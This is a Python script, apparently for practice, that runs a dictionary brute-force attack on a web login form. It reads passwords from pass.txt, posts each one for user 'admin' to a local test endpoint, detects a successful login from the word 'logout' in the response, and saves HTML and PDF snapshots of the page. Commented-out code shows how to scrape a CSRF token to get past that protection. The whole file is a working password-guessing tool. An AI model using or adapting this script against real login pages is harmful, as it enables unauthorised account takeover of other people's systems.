# importing

# sending receiving http request
import requests

# converting html file to pdf
import pdfkit

#for terminal color
import colorama
import termcolor

#calling the colorama init method
colorama.init()

with requests.session() as sess:
    url = "http://127.0.0.1/bruteMe"

    # save the screenshot of the given url

    file = open("screenshot.html", "w").write(sess.get(url=url).text)

    # converting html file to pdf of the website
    pdfkit.from_file("screenshot.html", "screenshot.pdf")

    # dictionary attack

    # open the file containing list of passwords
    passwdFile = open("pass.txt", "r")

    # iterate from all the way up to the real password
    for passw in passwdFile:
        passw = passw.strip("\n")

        #data to be passed as form data
        data = {
            'user': 'admin',
            'pass': passw,
            'login': 'submit'
        }
        
        #if the login page has implemented csrf token mechanism import bs4 then uncomment the follwing code
        
        #soup = bs4.BeautifulSoup(resp.content, 'html5lib')
        #data['nameOfToken'] = soup.find('input', attrs={'name': 'nameOfToken'})['value'] ---> (eg; <input type="hidden" name="csrf_token" value="hGTe6e576YUc446eYVt8O9fcC">)
    
        
        
        resp = sess.post(url=url+"/log.php", data=data)

        # as here status_code is same for every username and password combination
        # so we are checking whether this specific word is in response text or not because this can validate whether we have successfully logged in or not
        if "logout" in resp.text:
            print(termcolor.colored(" ".join(list(("success",str(resp.status_code), data['user'], data['pass']))), color='blue'))

             # save the screenshot of the webpage after logged in

            file=open("save.html", "w").write(resp.text)

            pdfkit.from_file("save.html", "save.pdf")

            break

        else:
            print(termcolor.colored(" ".join(list(("unsuccess",str(resp.status_code), data['user'], data['pass']))), color='red'))




